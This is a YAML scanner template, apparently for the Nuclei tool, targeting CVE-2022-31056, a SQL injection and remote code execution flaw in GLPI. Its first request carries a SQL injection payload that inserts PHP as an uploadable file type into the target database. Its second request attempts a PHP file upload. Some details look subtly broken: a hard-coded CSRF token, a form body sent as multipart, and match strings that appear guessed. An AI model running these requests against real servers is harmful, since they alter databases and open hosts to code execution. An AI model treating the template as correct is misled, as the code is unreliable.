id: CVE-2022-31056

info:
  name: GLPI SQL Injection and Remote Code Execution
  author: ProjectDiscoveryAI
  severity: critical
  description: GLPI versions >=10.0.0 and < 10.0.3 are vulnerable to SQL Injection and Remote Code Execution.
  impact: |
    Successful exploitation could lead to unauthorized access and execution of arbitrary code.
  remediation: |
    Apply the vendor-supplied patch or upgrade to a non-vulnerable version.
  reference:
    - http://packetstormsecurity.com/files/171656/GLPI-10.0.2-SQL-Injection-Remote-Code-Execution.html
    - https://github.com/glpi-project/glpi/security/advisories/GHSA-9q9x-7xxh-w4cg
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2022-31056
    cwe-id: CWE-89
    epss-score: 0.00237
    epss-percentile: 0.62501
    cpe: cpe:2.3:a:glpi-project:glpi:*:*:*:*:*:*:*:*
  metadata:
    vendor: glpi-project
    product: glpi
    shodan-query: http.title:"GLPI"
    fofa-query:
      - body="setup glpi"
      - icon_hash="-1474875778"
      - title="glpi"
    google-query: intitle:"glpi"
  tags: packetstorm

http:
  - method: POST
    path:
      - "{{BaseURL}}/front/change.form.php"

    body: |
      id=0&_glpi_csrf_token=752d2ff606bf360d809b682f0d9da9c23b290b31453f493f4924e16e77bbba35&_actors={"requester":[],"observer":[],"assign":[{"itemtype":"User","items_id":"2','2',); INSERT INTO `glpi_documenttypes` (`name`, `ext`, `icon`, `mime`, `is_uploadable`) VALUES('PHP', 'php', 'jpg-dist.png', 'application/x-php', 1); ---'","use_notification":"1","alternative_email":""}]}

    headers:
      Content-Type: application/x-www-form-urlencoded
    matchers:
      - type: word
        words:
          - "SQL syntax"
          - "MySQL error"
        part: body

  - method: POST
    path:
      - "{{BaseURL}}/ajax/fileupload.php"

    body: |
      name=_uploader_filename&showfilesize=1&_uploader_filename[]=test.php

    headers:
      Content-Type: multipart/form-data
    matchers:
      - type: word
        words:
          - "file uploaded successfully"
          - "test.php"
        part: body
